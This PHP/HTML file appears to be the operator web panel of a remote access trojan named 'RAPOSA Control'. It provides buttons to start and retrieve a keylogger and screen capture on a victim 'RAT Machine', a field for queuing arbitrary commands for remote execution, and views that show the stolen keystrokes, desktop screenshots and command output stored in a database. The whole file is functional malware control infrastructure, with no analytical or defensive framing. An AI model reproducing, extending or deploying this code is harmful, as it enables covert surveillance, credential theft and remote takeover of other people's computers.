<?php  
    if (isset($_GET['machine']) && !empty($_GET['machine'])) {
        $machine = $_GET['machine'];
    } elseif (isset($_POST['machine']) && !empty($_POST['machine'])) {
        $machine = $_POST['machine'];
    } else {
        $machine = 'no machine';
    }
?>

<section class="section">
    <div class="container">
        <div class="card has-background-dark">
            <div class="columns is-vcentered is-centered">
                <div class="column is-narrow">
                    <figure class="image" style="width: 10rem;">
                        <img src="<?= "$web_root/assets/images/possum.png"; ?>" alt="Raposa">
                    </figure>
                </div>
                <div class="column">
                    <h1 class="title">RAPOSA Control</h1>
                </div>
            </div>
        </div>
        <div class="box">
            <h2 class="subtitle">Quick Commands</h2>
            <form method="post" action="index.php">
                <input type="hidden" name="machine" value="<?= htmlspecialchars($machine) ?>">
                
                <div class="field is-grouped is-grouped-multiline">
                    <div class="control">
                        <button class="button is-info" type="submit" name="command" value="startkeylog">Start Keylogger</button>
                    </div>
                    <div class="control">
                        <button class="button is-light" type="submit" name="command" value="stopkeylog">Keylogger Retrieve</button>
                    </div>
                    <div class="control">
                        <button class="button is-info type="submit" name="command" value="startdc">Screen Start</button>
                    </div>
                    <div class="control">
                        <button class="button is-light" type="submit" name="command" value="stopdc">Screen Retrieve</button>
                    </div>
                </div>
            </form>
        </div>
        <div class="box">
            <form method="post" action="index.php" id="cmd_form">
                <div class="field">
                    <label class="label">RAT Machine:</label>
                    <div class="control">
                        <input class="input is-info" type="text" name="machine" readonly value="<?= htmlspecialchars($machine) ?>">
                    </div>
                </div>
                
                <div class="field">
                    <label class="label">Run command</label>
                    <div class="control">
                        <input class="input is-info" type="text" name="command" placeholder="start chrome www.google.com" size="35">
                    </div>
                </div>

                <div class="field is-grouped">
                    <div class="control">
                        <button class="button is-primary" type="submit" name="button_execute">Execute</button>
                    </div>
                    <div class="control">
                        <button class="button is-success" type="submit" name="button_result">Get Output</button>
                    </div>
                    <div class="control">
                        <button class="button is-success" type="submit" name="button_keylog">Get Keylog</button>
                    </div>
                    <div class="control">
                        <button class="button is-success" type="submit" name="button_screen">Screen</button>
                    </div>
                    <div class="control">
                        <a class="button" href="/">Home</a>
                    </div>
                </div>
            </form> 
        </div>

        <?php
        function get_machine_data($machine, $column) {
            $conn = connect_to_db();
            $query = "SELECT $column FROM machines WHERE name = ? ORDER BY id DESC LIMIT 1";
            $stmt = $conn->prepare($query);
            $stmt->bind_param('s', $machine);
            $stmt->execute();
            $stmt->bind_result($output);
            $stmt->fetch();
            $stmt->close();
            $conn->close();
            return $output;
        }

        if (isset($_POST['button_result'])) {
            $output = get_machine_data($machine, 'output');
            echo '
            <div class="card mt-5">
                <header class="card-header">
                    <p class="card-header-title">
                        Output
                    </p>
                </header>
                <div class="card-content">
                    <div class="content">
                        <textarea class="textarea is-info" rows="20" readonly>' . htmlspecialchars($output) . '</textarea>
                    </div>
                </div>
            </div>';
        }

        if (isset($_POST['button_keylog'])) {
            $output = get_machine_data($machine, 'keylog');
            echo '
            <div class="card mt-5">
                <header class="card-header">
                    <p class="card-header-title">
                        Keylog
                    </p>
                </header>
                <div class="card-content">
                    <div class="content">
                        <textarea class="textarea is-info" rows="20" readonly>' . htmlspecialchars($output) . '</textarea>
                    </div>
                </div>
            </div>';
        }

        if (isset($_POST['button_screen'])) {
            $output = get_machine_data($machine, 'desktop');
            $img = "<img width='600' src='data:image/jpeg;base64," . base64_encode($output) . "'/>";
            echo '
            <div class="card mt-5">
                <header class="card-header">
                    <p class="card-header-title">
                        Desktop
                    </p>
                </header>
                <div class="card-content">
                    <div class="content">
                        ' . $img . '
                    </div>
                </div>
            </div>';
        }

        if (isset($_POST['button_execute']) || in_array($_POST['command'] ?? '', ['startkeylog', 'stopkeylog', 'startdc', 'stopdc'])) {
            $command = $_POST['command'] ?? '';
            if (!empty($command)) {
                echo 'Received: ' . htmlspecialchars($command) . '<br>' . 'For ' . htmlspecialchars($machine);
                $conn = connect_to_db();
                $query = "UPDATE machines SET command = ? WHERE name = ?";
                $stmt = $conn->prepare($query);
                $stmt->bind_param('ss', $command, $machine);
                $stmt->execute();
                $stmt->close();
                $conn->close();
            } else {
                echo "Commands cannot be empty";
            }
        }
        ?>
    </div>
</section>
